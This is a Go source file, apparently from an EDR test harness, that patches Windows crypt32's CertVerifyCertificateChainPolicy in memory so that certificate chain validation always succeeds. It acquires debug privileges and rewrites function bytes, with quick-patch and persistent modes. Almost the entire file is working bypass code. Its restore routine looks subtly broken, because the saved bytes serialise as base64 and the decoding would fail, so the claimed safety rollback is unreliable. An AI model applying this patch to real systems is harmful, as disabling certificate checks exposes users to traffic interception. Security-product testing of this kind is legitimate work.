// cert_pinning_bypass.go - Certificate pinning bypass implementation with safety measures
// This file contains the actual implementation of certificate bypass techniques
// Build: Embedded in main test binary

//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_ALL_ACCESS        = 0x1F0FFF
	PAGE_EXECUTE_READWRITE    = 0x40
	SE_DEBUG_PRIVILEGE        = 20
)

var (
	kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
	advapi32DLL = syscall.NewLazyDLL("advapi32.dll")

	procOpenProcess          = kernel32DLL.NewProc("OpenProcess")
	procReadProcessMemory    = kernel32DLL.NewProc("ReadProcessMemory")
	procWriteProcessMemory   = kernel32DLL.NewProc("WriteProcessMemory")
	procVirtualProtectEx     = kernel32DLL.NewProc("VirtualProtectEx")
	procGetModuleHandleW     = kernel32DLL.NewProc("GetModuleHandleW")
	procGetProcAddress       = kernel32DLL.NewProc("GetProcAddress")
	procLookupPrivilegeValue = advapi32DLL.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges = advapi32DLL.NewProc("AdjustTokenPrivileges")
	procOpenProcessToken     = advapi32DLL.NewProc("OpenProcessToken")
)

// BypassMode defines the level of bypass to attempt
type BypassMode int

const (
	BypassModeTestOnly    BypassMode = 0  // Just test if bypass is possible (safest)
	BypassModeQuickPatch  BypassMode = 1  // Patch and immediately restore (safe)
	BypassModePersistent  BypassMode = 2  // Keep patch active (use with caution)
)

// PatchState stores information about applied patches
type PatchState struct {
	ProcessID       uint32    `json:"processId"`
	ProcessName     string    `json:"processName"`
	TargetDLL       string    `json:"targetDll"`
	TargetFunction  string    `json:"targetFunction"`
	TargetAddress   uintptr   `json:"targetAddress"`
	OriginalBytes   []byte    `json:"originalBytes"`
	PatchApplied    bool      `json:"patchApplied"`
	Timestamp       time.Time `json:"timestamp"`
	RequiresRestore bool      `json:"requiresRestore"`
}

// BypassResult contains the result of a bypass attempt
type BypassResult struct {
	Success         bool
	Mode            BypassMode
	Blocked         bool
	BlockedBy       string
	PatchesApplied  []PatchState
	ErrorMessage    string
	TestDuration    time.Duration
}

// AttemptCertificatePinningBypass is the main entry point for bypass attempts
func AttemptCertificatePinningBypass(mode BypassMode, targetProcess string) BypassResult {
	startTime := time.Now()

	result := BypassResult{
		Mode:           mode,
		PatchesApplied: []PatchState{},
	}

	fmt.Printf("[*] Certificate Pinning Bypass Attempt\n")
	fmt.Printf("[*] Mode: %s\n", getModeName(mode))
	fmt.Printf("[*] Target Process: %s\n", targetProcess)
	fmt.Println()

	// Step 1: Enable debug privileges
	fmt.Println("[*] Step 1: Requesting debug privileges...")
	if !enableDebugPrivilege() {
		result.Blocked = true
		result.BlockedBy = "Privilege Elevation"
		result.ErrorMessage = "Failed to obtain SeDebugPrivilege - EDR may be blocking"
		fmt.Println("[+] PROTECTED: Cannot obtain debug privileges (EDR protection active)")
		result.TestDuration = time.Since(startTime)
		return result
	}
	fmt.Println("[+] Debug privileges obtained")

	// Step 2: Locate target function
	fmt.Println()
	fmt.Println("[*] Step 2: Locating CRYPT32!CertVerifyCertificateChainPolicy...")
	targetAddr, originalBytes, err := locateCertFunction()
	if err != nil {
		// Check if this is an environmental issue (DLL not available) vs security block
		if strings.Contains(err.Error(), "DLL_NOT_AVAILABLE") {
			// This is NOT a security block - it's a test environment issue
			result.Blocked = false
			result.Success = false
			result.ErrorMessage = fmt.Sprintf("Environmental failure: %v", err)
			fmt.Printf("[!] TEST INCONCLUSIVE - Environmental Issue: %v\n", err)
			fmt.Println("[*] This is NOT a security block - likely cross-compilation or Windows compatibility issue")
			result.TestDuration = time.Since(startTime)
			return result
		}
		// Other errors might indicate security blocking
		result.Blocked = true
		result.BlockedBy = "Function Location"
		result.ErrorMessage = fmt.Sprintf("Failed to locate target function: %v", err)
		fmt.Printf("[!] Failed to locate function: %v\n", err)
		result.TestDuration = time.Since(startTime)
		return result
	}
	fmt.Printf("[+] Function located at: 0x%X\n", targetAddr)
	fmt.Printf("[+] Read %d original bytes\n", len(originalBytes))

	// Create patch state
	patch := PatchState{
		ProcessID:       uint32(os.Getpid()),
		ProcessName:     "self",
		TargetDLL:       "crypt32.dll",
		TargetFunction:  "CertVerifyCertificateChainPolicy",
		TargetAddress:   targetAddr,
		OriginalBytes:   originalBytes,
		PatchApplied:    false,
		Timestamp:       time.Now(),
		RequiresRestore: false,
	}

	// Save state before attempting patch
	saveBypassState([]PatchState{patch})

	// Step 3: Test write capability
	fmt.Println()
	fmt.Println("[*] Step 3: Testing memory write capability...")
	if !testMemoryWritable(targetAddr) {
		result.Blocked = true
		result.BlockedBy = "Memory Protection"
		result.ErrorMessage = "Target memory is protected by EDR/kernel protection"
		fmt.Println("[+] PROTECTED: Memory protection prevents write (EDR active)")
		result.TestDuration = time.Since(startTime)
		return result
	}
	fmt.Println("[+] Memory is writable")

	// Step 4: Execute bypass based on mode
	fmt.Println()
	fmt.Printf("[*] Step 4: Executing bypass (mode: %s)...\n", getModeName(mode))

	switch mode {
	case BypassModeTestOnly:
		result = executeTestOnlyMode(patch, originalBytes, targetAddr)

	case BypassModeQuickPatch:
		result = executeQuickPatchMode(patch, originalBytes, targetAddr)

	case BypassModePersistent:
		result = executePersistentMode(patch, originalBytes, targetAddr)
	}

	result.TestDuration = time.Since(startTime)
	return result
}

func getModeName(mode BypassMode) string {
	switch mode {
	case BypassModeTestOnly:
		return "TEST_ONLY (safest - no actual patch)"
	case BypassModeQuickPatch:
		return "QUICK_PATCH (patch + immediate restore)"
	case BypassModePersistent:
		return "PERSISTENT (patch remains active)"
	default:
		return "UNKNOWN"
	}
}

func executeTestOnlyMode(patch PatchState, originalBytes []byte, targetAddr uintptr) BypassResult {
	fmt.Println("[*] TEST_ONLY mode: Simulating bypass without actual patching")

	result := BypassResult{
		Success:        true,
		Mode:           BypassModeTestOnly,
		Blocked:        false,
		PatchesApplied: []PatchState{patch},
	}

	// Generate what the patch would be
	patchBytes := generateBypassPatch()

	fmt.Printf("[*] Would patch %d bytes at 0x%X\n", len(patchBytes), targetAddr)
	fmt.Printf("[*] Original: %X\n", originalBytes[:min(8, len(originalBytes))])
	fmt.Printf("[*] Patch:    %X\n", patchBytes[:min(8, len(patchBytes))])
	fmt.Println()
	fmt.Println("[!] Bypass would be SUCCESSFUL (system is vulnerable)")
	fmt.Println("[*] No actual patch applied - test only")

	return result
}

func executeQuickPatchMode(patch PatchState, originalBytes []byte, targetAddr uintptr) BypassResult {
	fmt.Println("[*] QUICK_PATCH mode: Apply patch with immediate restoration")

	result := BypassResult{
		Mode:           BypassModeQuickPatch,
		PatchesApplied: []PatchState{},
	}

	// Generate patch
	patchBytes := generateBypassPatch()

	fmt.Println("[*] Applying patch...")

	// Apply patch
	if !applyMemoryPatch(targetAddr, patchBytes) {
		result.Blocked = true
		result.BlockedBy = "Patch Application"
		result.ErrorMessage = "Failed to write patch - EDR blocked write operation"
		fmt.Println("[+] PROTECTED: EDR blocked patch application")
		return result
	}

	patch.PatchApplied = true
	patch.RequiresRestore = true
	result.PatchesApplied = append(result.PatchesApplied, patch)

	// Update state
	saveBypassState(result.PatchesApplied)

	fmt.Println("[!] Patch applied successfully!")
	fmt.Println("[*] Detection window: 100ms")

	// Brief detection window
	time.Sleep(100 * time.Millisecond)

	// Immediate restoration
	fmt.Println("[*] Restoring original bytes...")
	if !applyMemoryPatch(targetAddr, originalBytes) {
		result.Success = false
		result.ErrorMessage = "WARNING: Failed to restore original bytes!"
		fmt.Println("[!] WARNING: Restoration failed!")
		fmt.Println("[!] System may be in inconsistent state")
		return result
	}

	patch.PatchApplied = false
	patch.RequiresRestore = false
	result.PatchesApplied[0] = patch

	// Update state
	saveBypassState(result.PatchesApplied)

	fmt.Println("[+] Original bytes restored")
	fmt.Println("[+] System returned to original state")
	fmt.Println()
	fmt.Println("[!] Bypass was SUCCESSFUL during test window")
	fmt.Println("[!] System is vulnerable to certificate pinning bypass")

	result.Success = true
	return result
}

func executePersistentMode(patch PatchState, originalBytes []byte, targetAddr uintptr) BypassResult {
	fmt.Println("[!] PERSISTENT mode: Patch will remain active")
	fmt.Println("[!] WARNING: Watchdog MUST be running for safety!")

	result := BypassResult{
		Mode:           BypassModePersistent,
		PatchesApplied: []PatchState{},
	}

	// Check if watchdog is running
	if !isWatchdogRunning() {
		result.Success = false
		result.ErrorMessage = "SAFETY ABORT: Watchdog not running - cannot proceed with persistent patch"
		fmt.Println("[!] SAFETY ABORT: Watchdog process not detected")
		fmt.Println("[!] Persistent mode requires active watchdog")
		return result
	}

	fmt.Println("[+] Watchdog detected - proceeding")

	// Generate and apply patch
	patchBytes := generateBypassPatch()

	fmt.Println("[*] Applying persistent patch...")
	if !applyMemoryPatch(targetAddr, patchBytes) {
		result.Blocked = true
		result.BlockedBy = "Patch Application"
		result.ErrorMessage = "Failed to write patch - EDR blocked write operation"
		fmt.Println("[+] PROTECTED: EDR blocked patch application")
		return result
	}

	patch.PatchApplied = true
	patch.RequiresRestore = true
	result.PatchesApplied = append(result.PatchesApplied, patch)
	result.Success = true

	// Save state for watchdog
	saveBypassState(result.PatchesApplied)

	fmt.Println("[!] Persistent patch applied successfully!")
	fmt.Println("[!] Certificate validation is now bypassed")
	fmt.Println("[*] Watchdog will restore on test completion or timeout")

	return result
}

func enableDebugPrivilege() bool {
	var token syscall.Token
	currentProcess, _ := syscall.GetCurrentProcess()

	// Open process token
	r1, _, _ := procOpenProcessToken.Call(
		uintptr(currentProcess),
		syscall.TOKEN_ADJUST_PRIVILEGES|syscall.TOKEN_QUERY,
		uintptr(unsafe.Pointer(&token)),
	)

	if r1 == 0 {
		return false
	}
	defer syscall.CloseHandle(syscall.Handle(token))

	// Lookup privilege value
	var luid windows.LUID
	privName, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")

	r1, _, _ = procLookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(privName)),
		uintptr(unsafe.Pointer(&luid)),
	)

	if r1 == 0 {
		return false
	}

	// Enable privilege
	type TOKEN_PRIVILEGES struct {
		PrivilegeCount uint32
		Privileges     [1]windows.LUIDAndAttributes
	}

	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	r1, _, _ = procAdjustTokenPrivileges.Call(
		uintptr(token),
		0,
		uintptr(unsafe.Pointer(&tp)),
		0,
		0,
		0,
	)

	return r1 != 0
}

func locateCertFunction() (uintptr, []byte, error) {
	var err error

	// Try to get handle to crypt32.dll (check if already loaded)
	dllName, _ := syscall.UTF16PtrFromString("crypt32.dll")
	r1, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(dllName)))

	// If DLL not loaded, try to load it explicitly
	if r1 == 0 {
		fmt.Println("[*] crypt32.dll not loaded, attempting LoadLibrary...")
		dll, err := syscall.LoadDLL("crypt32.dll")
		if err != nil {
			return 0, nil, fmt.Errorf("DLL_NOT_AVAILABLE: %v (this is NOT a security block - likely cross-compilation or Windows compatibility issue)", err)
		}
		r1 = uintptr(dll.Handle)
		fmt.Println("[+] Successfully loaded crypt32.dll")
	}

	dllHandle := syscall.Handle(r1)

	// Get address of CertVerifyCertificateChainPolicy
	funcName, _ := syscall.BytePtrFromString("CertVerifyCertificateChainPolicy")
	r1, _, err = procGetProcAddress.Call(
		uintptr(dllHandle),
		uintptr(unsafe.Pointer(funcName)),
	)

	if r1 == 0 {
		return 0, nil, fmt.Errorf("failed to get function address: %v", err)
	}

	funcAddr := uintptr(r1)

	// Read original bytes (we'll read 16 bytes to be safe)
	originalBytes := make([]byte, 16)
	for i := 0; i < 16; i++ {
		originalBytes[i] = *(*byte)(unsafe.Pointer(funcAddr + uintptr(i)))
	}

	return funcAddr, originalBytes, nil
}

func testMemoryWritable(addr uintptr) bool {
	// Try to change memory protection
	var oldProtect uint32
	r1, _, _ := procVirtualProtectEx.Call(
		uintptr(^uintptr(0)), // -1 = current process
		addr,
		16,
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if r1 == 0 {
		return false
	}

	// Restore original protection
	procVirtualProtectEx.Call(
		uintptr(^uintptr(0)),
		addr,
		16,
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	return true
}

func generateBypassPatch() []byte {
	// x86_64 assembly to return success (TRUE) immediately
	// mov eax, 1    ; Return TRUE
	// ret           ; Return to caller
	return []byte{
		0xB8, 0x01, 0x00, 0x00, 0x00, // mov eax, 1
		0xC3,                         // ret
	}
}

func applyMemoryPatch(addr uintptr, patchBytes []byte) bool {
	// Change memory protection
	var oldProtect uint32
	r1, _, _ := procVirtualProtectEx.Call(
		uintptr(^uintptr(0)),
		addr,
		uintptr(len(patchBytes)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if r1 == 0 {
		return false
	}

	// Write patch bytes
	for i, b := range patchBytes {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	// Restore protection
	procVirtualProtectEx.Call(
		uintptr(^uintptr(0)),
		addr,
		uintptr(len(patchBytes)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	return true
}

func saveBypassState(patches []PatchState) error {
	stateFile := "C:\\F0\\watchdog_state.json"

	// Create minimal state structure
	state := map[string]interface{}{
		"watchdogPid":     0, // Will be filled by watchdog
		"monitoredPid":    os.Getpid(),
		"startTime":       time.Now(),
		"lastCheck":       time.Now(),
		"checkInterval":   2,
		"patches":         patches,
		"autoRestoreTime": 300,
		"status":          "ACTIVE",
	}

	data, err := json.MarshalIndent(state, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(stateFile, data, 0644)
}

func isWatchdogRunning() bool {
	// Check if watchdog state file exists and is recent
	stateFile := "C:\\F0\\watchdog_state.json"

	info, err := os.Stat(stateFile)
	if err != nil {
		return false
	}

	// Consider watchdog running if state file was updated in last 10 seconds
	return time.Since(info.ModTime()) < 10*time.Second
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func RestoreAllPatches() error {
	stateFile := "C:\\F0\\watchdog_state.json"

	data, err := os.ReadFile(stateFile)
	if err != nil {
		return err
	}

	var state map[string]interface{}
	if err := json.Unmarshal(data, &state); err != nil {
		return err
	}

	patchesData, ok := state["patches"].([]interface{})
	if !ok {
		return fmt.Errorf("no patches found in state")
	}

	fmt.Println("[*] Restoring patches...")
	restored := 0

	for i, patchData := range patchesData {
		patchMap := patchData.(map[string]interface{})
		if !patchMap["requiresRestore"].(bool) {
			continue
		}

		addr := uintptr(patchMap["targetAddress"].(float64))
		originalBytesIface := patchMap["originalBytes"].([]interface{})
		originalBytes := make([]byte, len(originalBytesIface))
		for j, b := range originalBytesIface {
			originalBytes[j] = byte(b.(float64))
		}

		fmt.Printf("[%d] Restoring patch at 0x%X...\n", i+1, addr)
		if applyMemoryPatch(addr, originalBytes) {
			fmt.Println("    [+] Restored")
			restored++
		} else {
			fmt.Println("    [!] Failed")
		}
	}

	fmt.Printf("[+] Restored %d patch(es)\n", restored)
	return nil
}
